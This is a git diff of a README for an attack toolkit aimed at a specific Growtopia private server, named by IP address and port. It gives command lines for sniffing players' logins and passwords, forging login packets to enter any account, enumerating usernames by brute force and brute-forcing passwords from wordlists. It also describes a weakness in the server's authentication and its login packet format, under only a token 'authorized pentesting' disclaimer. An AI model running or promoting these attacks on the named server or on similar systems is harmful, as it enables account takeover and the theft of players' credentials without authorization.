@@ -1,55 +1,72 @@
-# Piter Tools — GTPS Packet Sniffer & Exploitation Toolkit
+# Piter Tools — GTPS Attack Toolkit
 
-Toolkit buat intercept, sniff, dan exploit traffic Growtopia Private Server
-(Piter Server). Bekerja langsung di layer ENet/UDP — bypass WebView entirely.
+Advanced Growtopia Private Server exploitation toolkit.  
+Sniff, forge, brute, and MITM — everything you need to own the Piter Server.
 
 ## Target
-
 - **IP**: 103.129.148.178
-- **Game port**: UDP 17091
-- **Server**: Piter Server (Windows Server 2022, DRASTORE-based)
-- **Auth**: FAKE — HTTP layer menerima semua credential, tapi game server (ENet) ngecek password dari file player di disk
+- **Game Port**: UDP 17091
+- **Type**: Piter Server (DRASTORE-based), Windows Server 2022
+- **Auth**: Fake HTTP layer — real auth in ENet game server via player files on disk
 
 ## Install
 
 ```bash
-git clone https://github.com/nabenns/piter-tools.git
+git clone https://github.com/Nabenns/piter-tools.git
 cd piter-tools
-chmod +x piter_sniff.py piter_setup.sh
+chmod +x piter_cli.py
 ```
 
-Python 3.7+. No external dependencies — pure stdlib.
+No dependencies. Python 3.7+ stdlib only.
 
-## Usage
+## Commands
 
-### 1. SNIFF — Capture traffic pas main
-```bash
-sudo python3 piter_sniff.py sniff
 ```
-Buka Growtopia, login — semua packet ENet ke-capture (GrowID, password, response server).
-
-### 2. FORGE — Login ke akun siapa aja tanpa client GT
-```bash
-python3 piter_sniff.py forge <GrowID> <password>
+piter_cli.py info              — Server recon, target info, exploit vectors
+piter_cli.py scan              — Quick scan for common GrowIDs
+piter_cli.py forge <ID> <PASS> — Forge ENet login packet directly to server
+piter_cli.py brute <WORDLIST>  — Brute force GrowID enumeration
+piter_cli.py brute-pass <ID> <WORDLIST> — Brute force password for known account
+piter_cli.py monitor           — Live traffic viewer (needs tcpdump)
+piter_cli.py sniff [OUTPUT]    — Full packet capture to file (needs root)
 ```
-Bypass WebView — kirim ENet packet langsung ke UDP 17091.
 
-### 3. BRUTE — Enumerate GrowID massal
+## Quick Start
+
 ```bash
-echo -e "piterp\nadmin\nOwner\nPiter\nroot" > growids.txt
-python3 piter_sniff.py brute growids.txt
+# See what we know about the target
+python3 piter_cli.py info
+
+# Quick scan for known accounts
+python3 piter_cli.py scan
+
+# Sniff traffic while you play
+sudo python3 piter_cli.py sniff piter_dump.txt
+
+# Brute force a wordlist
+echo -e "piterp\nadmin\nOwner" > names.txt
+python3 piter_cli.py brute names.txt
+
+# Once you find an account, brute its password
+echo -e "piter123\npassword\nadmin" > passwords.txt
+python3 piter_cli.py brute-pass admin passwords.txt
 ```
-Auto-detect: "invalid credentials" = akun ADA, "not found" = skip.
 
-### 4. PROXY — MITM (modify/block/replay packets)
-```bash
-sudo python3 piter_sniff.py proxy
+## Module Structure
+
+```
+piter_tools/
+  enet.py       — ENet protocol parser (CONNECT, VERIFY, reliable/unreliable)
+  protocol.py   — Tank protocol decoder (GameUpdatePacket, tank fields)
+  exploit.py    — Auth bypass, player enumeration, packet forging
+piter_cli.py    — Main CLI with all attack modes
+piter_sniff.py  — Legacy sniffer (stdalone)
+piter_tcpdump.py — macOS optimized sniffer using tcpdump
 ```
 
 ## Protocol
 
-Server Piter menggunakan DRASTORE (41-field ENet), tapi packet login pakai
-format Gurotopia (5-field pipe-delimited):
+Server uses DRASTORE (41-field ENet) but login packets use Gurotopia format:
 ```
 requestedName|GrowID
 tankIDName|GrowID
@@ -57,9 +74,9 @@ tankIDPass|password
 _token=timestamp&growId=GrowID&password=pass&reg=0
 ```
 
-HTTP layer (port 80/443/5000) 100% echo — tidak validasi, tidak menulis ke disk.
-Game server ENet yang sebenarnya membaca player file dari filesystem.
+HTTP layer (port 80/443/5000) is 100% echo — no validation, no disk writes.  
+Real auth happens in the ENet game server which reads player files from disk.
 
 ## Disclaimer
 
-Educational / authorized pentesting only.
+Educational / authorized pentesting only. Don't be a dick.
